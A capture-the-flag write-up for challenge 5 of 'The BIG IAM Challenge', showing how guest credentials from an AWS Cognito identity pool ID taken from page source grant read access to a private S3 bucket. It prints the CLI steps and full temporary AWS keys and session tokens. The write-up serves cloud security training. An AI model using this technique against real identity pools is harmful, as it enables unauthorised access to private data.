---
tags:
  - IAM
  - Cognito
  - S3
title: The BIG IAM Challenge - Do I Know You
description: Be aware how identity pool generate AWS credentials for the guest access
reference: https://thebigiamchallenge.com/challenge/5
---

## Challenge

We configured AWS Cognito as our main identity provider. Let's hope we didn't make any mistakes.

## Solution

### 1. View the provided IAM Policy

```json
{ "Version": "2012-10-17", "Statement": [ { "Sid": "VisualEditor0", "Effect": "Allow", "Action": [ "mobileanalytics:PutEvents", "cognito-sync:*" ], "Resource": "*" }, { "Sid": "VisualEditor1", "Effect": "Allow", "Action": [ "s3:GetObject", "s3:ListBucket" ], "Resource": [ "arn:aws:s3:::wiz-privatefiles", "arn:aws:s3:::wiz-privatefiles/*" ] } ] }
```

### 2. What are AWS Mobile Analytics and AWS Cognito Sync

Amazon Mobile Analytics was a service for collecting, visualizing, understanding, and extracting app usage data at scale.

Amazon Cognito Sync is an AWS service and client library that makes it possible to **sync application-related user data across devices.** Amazon Cognito Sync can synchronize user profile data across mobile devices and the web without using your own backend. The client libraries cache data locally so that your app can read and write data regardless of device connectivity status. When the device is online, you can synchronize data. If you set up push sync, you can notify other devices immediately that an update is available.

### 3. Observing the website elements

The cognito image is **a signed image on S3!**!

![[wiz_iam_ch_5 1.mp4]]

Use browser developer tool to copy the elements:

- the image is stored in S3 bucket `wiz-privatefiles`.
- identity pool id: `us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b`
	- Amazon Cognito identity pools provide temporary AWS credentials for users who are guests (**unauthenticated**) and for users who have been authenticated and received a token. An identity pool is **a store of user identifiers linked to your external identity providers**.

```
<img style="width: 16rem" id="signedImg" class="mx-auto mt-4" src="https://wiz-privatefiles.s3.amazonaws.com/cognito1.png?AWSAccessKeyId=ASIARK7LBOHXORQTFYAG&amp;Expires=1748256168&amp;Signature=4eJdL1fzIAyEq2aV91f4VGphkZo%3D&amp;x-amz-security-token=IQoJb3JpZ2luX2VjEHoaCXVzLWVhc3QtMSJGMEQCIH4qCFaasM9jjHqNxyl6nj7zptApgwRL9MpowMijQajhAiBUFHHevHpTWebY%2FnuOsq%2FJHx4VI9695%2FcFr1WDBqgM%2FSqwBQhDEAAaDDA5MjI5Nzg1MTM3NCIMs9QdMX%2FJxX2whqqZKo0Fzl3mSMIlMzf5ORIxYs9XnEg0wPpdR5eZ2UfqDbaUGKb%2BBV75WbRkfRAtHgaCu4uSbFnxsH3Ze9c1QHORqSPQT4lisRsmwgzqTUccCbs52LVjqjbkTRNF3c4JKJb89mzhI4Jh9zCtJd94Pi9n%2BYrF2Ka4LpNWObbxFm4vEDxfA47MsHmt5MConIp3Vj%2FI9vOL4%2BhSyaCrMjomahv5vhnCgSjPkN8rZNzps%2Boa2Ol6RrDrXti3VpbnXFtiPhBUn8Aoje4zMWltSrQpHwdB3%2FtO3C6nqsYBjZevr%2FWjQvwJANmlE%2FAymtNFv4RTDO7XmhEtdlJ%2BnuldcnZSJTpL9y0JbJLrWUImdGqx24AtLhZ9nqwPV%2BU8yFjMpPbvqip34PXR0wglthsgYD42ZgqKb37MZUvqU1aw4hlpcJ8AN6iK%2BzwxpP%2F%2FuCalz5aoS8dic2fYjyug%2Bxt%2FvOC8bT4Jcre5t%2Bi0HuQIbicWou6fwenBOByKx4XT4AZ8VFGkj6PG3trrZQ2vFtiCW862fUSNmsQRrRRPPqSr9Aju5DaQ2jJ5zpIUoURI2o%2BhKgiGdThylqFFPl%2BId0EGydwpuqoh3ww2VQ58rTnxG%2FjtjZh9m51OTYjBUrQGlo9h8ikXeQpp0iCbFBQPcphKTPwirTftkEwZHd8tVvhWiYl8LdcuPrcAK%2FNYgGIUvDWyTEBfSdfIVBojoP8IK2266cQ7NG1VQp7nBLEV0YcQs4PBImkbeRpkEXKSuo%2Bv1mVfCXaI4mvlHx6Vzgtvj8FedbPOEPk8XlvnwXn3DdYweNG0djNMlsHA4dfpom3TjsBkLbEGeWzCNw5yCLPW9791GewAdHthciQvwqWy2iuc4aRtD%2FJ88KgwmO%2FQwQY63wKLrV%2Fbq8cgVByODYSwkw48bPYNTtRmkSb7P44AbOWkFfTidSZxSBZbYG5v92bTNk8%2BmIci%2FfXGGAdqtOOOBc8HmiegCuetnBrdn9MmIsL9wXECs0N%2FVvxAnEhRbwvWot0UheLzcFR6T6sw4%2FFai5N9yiYyeQjzu%2BkGUcmqx1ZrxbzDKsv0zcVXjR5yIlLOrweBFOIkmAyPWlzlifhpqVs9IpJ1gick%2FebeUaOSiSWETwBEZu7rPNIk6FaWfidN81jAK2OOHimyKKzrgug%2BBRj8p6X5hDvAD5fieEa%2BZu%2Fv%2BLV4mZPUc2lF0yL2SqE6q94OGLY4d7NtxwTTzJHj7zujN%2BHI%2F0ce8tJ6LbT6Bjsxz9KIlUr25lq1piKXHx0xQb47SjTL1%2BCV%2BfYS8xMM0WK86My9mC83MvdF8NUDDdiFfJG8CBULgl9nKMcz67fKATBgAB4dVLlO0InxNZvdLjY%3D" alt="Signed img from S3">
<script src="https://sdk.amazonaws.com/js/aws-sdk-2.719.0.min.js"></script>

  AWS.config.region = 'us-east-1';
  AWS.config.credentials = new AWS.CognitoIdentityCredentials({IdentityPoolId: "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"});
  // Set the region
  AWS.config.update({region: 'us-east-1'});

  $(document).ready(function() {
    var s3 = new AWS.S3();
    params = {
      Bucket: 'wiz-privatefiles',
      Key: 'cognito1.png',
      Expires: 60 * 60
    }

    signedUrl = s3.getSignedUrl('getObject', params, function (err, url) {
      $('#signedImg').attr('src', url);
    });
});
```

### 4. Study the Identity pools authentication flow


![[aws identity pools auth flow.png]]

1. Your application presents a proof of authentication–a JSON web token or a SAML assertion–from an authorized Amazon Cognito user pool or third-party identity provider in a [GetID](https://docs.aws.amazon.com/cognitoidentity/latest/APIReference/API_GetId.html) request.
2. Your identity pool returns an identity ID.
3. Your application combines the identity ID with the same proof of authentication in a [GetCredentialsForIdentity](https://docs.aws.amazon.com/cognitoidentity/latest/APIReference/API_GetCredentialsForIdentity.html) request.
4. Your identity pool returns AWS credentials.
5. Your application signs AWS API requests with the temporary credentials.

Reference: https://docs.aws.amazon.com/cognito/latest/developerguide/authentication-flow.html

### 5. Authentication

1. get identity id
```
> aws cognito-identity get-id --identity-pool-id us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b

{

    "IdentityId": "us-east-1:157d6171-ee8b-cc0c-c368-7933c4553f14"

}
```

2. get AWS role credentials for the identity id

```
> aws cognito-identity get-credentials-for-identity --identity-id us-east-1:157d6171-ee8b-cc0c-c368-7933c4553f14

{

    "IdentityId": "us-east-1:157d6171-ee8b-cc0c-c368-7933c4553f14",

    "Credentials": {

        "AccessKeyId": "ASIARK7LBOHXDOO5IS6L",

        "SecretKey": "U7OogZZEjv7YjL0KKpJSfLaed7jxLGJYUXidS3rQ",

        "SessionToken": "IQoJb3JpZ2luX2VjEHsaCXVzLWVhc3QtMSJGMEQCICjm+071xwvxZ1CIMdZs9b4AgNDmpbuGbl584+r8M4KEAiAKCI/p1K5jW2o5fp8vcBig

ISJvLLlCFT/9mVK8C1yLTyqxBQhEEAAaDDA5MjI5Nzg1MTM3NCIMFHwSSDWqLwYPrYIEKo4FMbGA5qxxiugh5Uv7nsF+sb9iks3OrXyoDDgT8aF+i1OeQmI7mAncoS5DuLn23

enicKUIs3ICTgk5TjKgP1x8yM4k+IGP0gHoygZdl8BeGTlkj/T0whz3OG8fxvzs4G46J7E5dP/qQfoCRkxVtWLT3NiP7qA+zy0rf1gsEdSRUAFdzzdI9CnwVbHFiXpwdrfJbp

kJjTU77W01z5eZBOeZTQLbmrN80W0FDWAzdu5lNIgaXBJumYWkbHAkPJje3lsPQH3yzzTUO6d/udhd+5SZusGc2MEXJdj/F3RcWBMjWdFo2XGqB6vwO7+eegAKAHWw2WSMpYq

vjVpbfkXWcBU06fktFOBm37lG6w+PlZCdDNsmZ096NkBIzdJZ1h91txwKEb3SeZ0ux5Uv1AgIeWSe2kBP0bFHMX0hqvQhQ2jR6ARWDqJ69tMkp93H109DvE2r+SDJFbRjrEIh

nKe5W04xsjxXL4C14uHHRezzOFxQlze8/deJAlMOSNsOIBwkcU8J2NyriE0TMPApw6J+fUYAn0+dSXD9K0def94DRlQq/7awcZHS1MDPJAwTNWIJW1miGanZWUkjv8JmYBJ/A

+aaj9YFpQBFFKqvpQKsunfre5dY9n6MiMgV+PMN9yEmuK7QKyGzIUxPSdxYh+kJR07gLi9rXGbl1YJF8tQv7SKMVAFerDIqQK2Ny6YoTA6xxqWXkgROpch9NORN5cm+5aY5ew

rCDoY2Z8Lexxcka/AVwEZzAAbdHMKaFHxBJqym9EkPSv7PXMM0lcLztCiNvsUUhCpU7ee7DcstXi7cO9tVQUnSMr8WVkrJ8hJZZbjpnR7OKHr1d2+ydHzP1sqlKt7jWMip2ab

KUFiHUw8qYxpyMImF0cEGOt4Ce4cO5pquAaDdAyxtEwdYVBcKRNloKMEI1RHARhxXXNNJti6fR9COFnSKnlDquNNuf3967EM4UmmSnNXVcPsouQ8PMBapP/Sci8+6VM6uh/HH

KIButcbLkww+uCFzUna5B/1Pk0jNqvuIJpB+ebjSKqiA6mojxLsjePiMSh5egUJly97BUr9P054si+B0RmziFcELOEGuOZeQ0ialBc/5aLEWfzO2Vk7pOBufUnUZy0AsHAJyf

OjRbFACoOEC799J0qFm4SDOGOLF0WDE3Ex58LaCIU0G7KZu0ppLo9ufcgjNPLzGN7iI5JLq1E2WQIYphvAN34wgCEa/JbqEcyshaZlyFlO5JtVedUeeXfsSYuQkXaa5CISk2H

7M3/RJSVYLZdP3aOT8LmTxM0weXJ63EaZr0TMOivInrrxUl2q5GRpKB+tjqparuXHc2K2Lkgj0yGy1jzJ6bZPok2F+UMI=",

        "Expiration": 1748258969.0

    }

}
```

### 6. Configure aws cli credential 

```
tim@tim-virtual-machine ~/.aws [2]> aws sts get-caller-identity
{
    "UserId": "AROARK7LBOHXJKAIRDRIU:CognitoIdentityCredentials",
    "Account": "092297851374",
    "Arn": "arn:aws:sts::092297851374:assumed-role/Cognito_s3accessUnauth_Role/CognitoIdentityCredentials"
}
```

### 7. Try to access the S3 bucket

```
tim@tim-virtual-machine ~/.aws> aws s3 ls wiz-privatefiles
2023-06-06 03:42:27       4220 cognito1.png
2023-06-05 21:28:35         37 flag1.txt
tim@tim-virtual-machine ~/.aws> aws s3 cp s3://wiz-privatefiles/flag1.txt flag1.txt
download: s3://wiz-privatefiles/flag1.txt to ./flag1.txt
tim@tim-virtual-machine ~/.aws> cat flag1.txt
{wiz:incognito-is-always-suspicious}
```